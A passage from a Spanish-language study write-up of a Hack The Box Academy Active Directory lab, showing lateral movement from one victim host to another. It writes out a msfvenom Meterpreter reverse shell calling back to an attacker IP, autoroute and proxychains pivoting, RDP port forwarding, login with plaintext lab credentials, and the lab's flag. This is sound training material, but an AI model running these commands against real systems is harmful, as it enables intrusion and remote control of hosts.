...
Ahora necesitaba alcanzar un objetivo al que solo podria acceder desde dentro de la maquina victima para pivotear, en este caso la forma que se me hace mas facil es pivotear a traves de Metasploit, para lo cual primero creo un Reverse Shell con `msfvenom`

```
#Crear ejecutable con reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=1234 -f exe > exploit.exe

#Luego inicio msfconsole y inicio el modulo de /multi/handler
msfconsole
> use /multi/handler
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LPORT 1234
...
> run
```
Luego hacer el pivoting
```
#Verificar maquina victima 2, desde la maquina victima 1
ping MS01
	Pinging MS01.INLANEFREIGHT.LOCAL [172.16.6.50] with 32 bytes of data:
	Reply from 172.16.6.50: bytes=32 time<1ms TTL=128

#Verificando el adaptador de red interno
ipconfig
   IPv4 Address. . . . . . . . . . . : 172.16.6.100

#Se agrega a meterpreter el segmento de red interno
meterpreter > run autoroute -s 172.16.6.1/24
meterpreter > run autoroute -p  #Para verificar, luego cntrl+Z
msf> use scanner/portscan/tcp
msf> set RHOSTS 172.16.6.50

```
Ya dentro del host victima y con una consola mas interactiva que la que se ofrecia a traves de la web, se pueden ejecutar los comandos de forma mas facil. Ademas se inicia sesion con las credenciales obtenidas creando los objetos seguros en powershell y luego usando PowerView para iniciar sesion como otro usuario a traves de [**WinRM**](https://github.com/Yonathan808/Estudios-Hack-The-Box/blob/main/Academy/Penetration%20Tester/12.%20Active%20Directory%20Enumeration%20%26%20Attacks.md#winrm)
```
powershell.exe
> Import-Module ./PowerView.ps1
...
> Enter-PSSession -ComputerName MS01 -Credential $cred		#O si no funciona tal vez podria funcionar con "MS01.inlanefreight.local"

Aqui aunque tenemos acceso no se puede hacer mucho mas, no es una sesion interactiva
```
Luego se enruta el trafico desde meterpreter hacia la maquina atacante, esto se hace com Proxychain
```
use auxiliary/server/socks_proxy 	--> run

#Se crea una ruta a la maquina atacante
use multi/manage/autoroute
set SESSION X
set SUBNET 172.16.6.0
nano /etc/proxychains.conf		#Se comprueba que se agregue la ruta (en mi caso no aparece)
```
Luego para realizar la conexion con la maquina victima 2, se hace un escaneo y luego se hace la conexion
```
#Ahora en este punto ya se puede hacer una enumeracion de puertos (En mi caso por alguna razon no aparecia ningun puerto abierto)

proxychains nmap -sS -v -Pn 172.16.6.50

#Luego segun se tenia que hacer (foros) se conecta a traves de RDP por el 3389, la cuestion es que este puerto necesita comprobaciones que no permite ejecutar el una conexion directa con xfreerdp. Para lo cual primero se debe hacer un PortForwarding

meterpreter> portfwd add -l 1111(yo) -p 3389(vic.2) -r 172.16.6.50
xfreerdp3 /v:localhost:1234 /u:"inlanefreight\svc_sql" /p:lucky7 /dynamic-resolution /drive:Shared,/opt/Tools/Windows		#Por alguna razon ahora toca ejecutarlo de esta manera con esas opciones para que ejecute bien
#Ademas que en las opciones anteriores aparece una opcion para crear una carpeta compartida "/opt/Tools/Windows"

Luego solo es buscar la flag: spn$_r0ast1ng_on_@n_0p3n_f1re
```
